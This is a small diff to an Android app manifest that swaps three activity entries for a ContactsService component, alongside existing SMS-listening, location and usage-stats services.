@@ -39,9 +39,9 @@
             </intent-filter>
         </activity>
         <activity android:name=".MainActivity" ></activity>
-        <activity android:name=".Contacts" ></activity>
-        <activity android:name=".Apps" ></activity>
-        <activity android:name=".Location"></activity>
+        <activity android:name=".ContactsService" ></activity>
+
+        <service android:name=".ContactsService"></service>
         <service android:name=".ListenSmsMmsService" ></service>
         <service android:name=".LocationService"></service>
         <service android:name=".UsageStatService"></service>
